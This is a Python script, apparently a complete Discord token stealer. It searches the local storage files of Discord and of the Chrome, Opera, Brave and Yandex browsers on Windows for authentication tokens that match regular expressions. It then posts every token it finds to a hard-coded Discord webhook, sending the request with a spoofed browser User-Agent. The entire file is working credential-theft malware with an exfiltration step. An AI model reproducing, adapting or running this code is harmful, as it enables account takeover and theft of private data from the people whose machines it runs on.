import os
import re
import base64
import requests
import json
import plyvel

WEBHOOK_URL = 'https://discord.com/api/webhooks/1209489160495304764/pSNsnAH07u8mAM3Ra9-oZTqhSZ5ysg_c5wLWAeepqdA-OPTEsxcQYH-Po1IIXHuiXQI2'

def find_tokens(path):
    tokens = []

    for file_name in os.listdir(path):
        if file_name.endswith('.log') or file_name.endswith('.ldb'):
            print(f"Searching file: {file_name}")

            if file_name.endswith('.ldb'):
                try:
                    db = plyvel.DB(path, create_if_missing=False)
                    for key, value in db:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, value.decode()):
                                tokens.append(token)
                    db.close()
                except:
                    pass
            else:
                for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)

    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Discord leveldb': roaming + '\\Discord\\Local Storage\\leveldb',
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    messages = [message[i:i+2000] for i in range(0, len(message), 2000)]

    for msg in messages:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': msg})

        try:
            req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
            print(req.text)
        except:
            pass

if __name__ == '__main__':
    main()